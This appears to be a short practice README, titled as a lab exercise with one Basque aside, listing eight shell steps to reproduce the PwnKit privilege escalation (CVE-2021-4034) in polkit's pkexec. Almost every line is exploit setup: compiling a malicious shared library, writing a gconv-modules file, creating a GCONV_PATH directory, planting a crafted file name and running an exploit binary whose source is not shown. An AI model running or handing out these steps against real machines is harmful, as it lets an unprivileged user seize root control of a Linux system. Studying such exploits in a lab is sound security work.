# DEV_Practica_CVE_2021_4034

1. gcc -Wall -shared -fPIC -o pwnkit.so pwnkit.c

2. echo "module UTF-8// TRUKITO// pwnkit 1" > gconv-modules

3. mkdir -p GCONV_PATH=.

4. which true (gure kasuan /bin/true)

5. TRUE=/bin/true

6. cp "$TRUE" 'GCONV_PATH=./pwnkit.so:.'

7. gcc -o exploit exploit.c

8. ./exploit
